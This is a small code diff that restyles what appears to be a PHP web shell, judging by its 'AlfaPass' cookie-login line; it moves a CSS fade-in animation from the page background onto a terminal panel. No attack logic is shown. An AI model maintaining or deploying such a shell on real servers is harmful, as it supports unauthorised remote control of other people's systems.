@@ -608,16 +608,6 @@ __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
         background-size: cover;
         background-repeat: no-repeat;
         background-attachment: fixed;
-        animation: fadein 7s;
-    }
-    @keyframes fadein {
-        from {
-            filter: brightness(0%);
-        }
-
-        to {
-            filter: brightness(100%);
-        }
     }
 
     .terminal {
@@ -630,8 +620,8 @@ __alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
         height: 250px;
         background: rgba(36, 38, 46, 1);
         border: 1px solid #eaeaea;
+        animation: fadein 7s;
     }
-
     @keyframes fadein {
         from {
             filter: brightness(0%);
